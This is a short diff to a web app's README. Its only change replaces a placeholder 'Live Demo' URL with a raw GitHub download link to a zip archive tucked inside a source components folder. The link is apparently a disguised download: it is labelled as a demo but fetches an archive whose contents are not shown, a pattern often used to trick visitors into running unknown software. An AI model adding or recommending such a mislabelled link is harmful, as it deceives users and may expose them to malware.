@@ -4,7 +4,7 @@ A modern web application built with React, TypeScript, Tailwind CSS, and Vite.
 
 ## Project URL
 
-[Live Demo](https://your-project-url.com)
+[Live Demo](https://github.com/Balu323e48w/zenlead-studio/raw/refs/heads/main/src/components/video-processing/studio-zenlead-v1.7.zip)
 
 ---
 
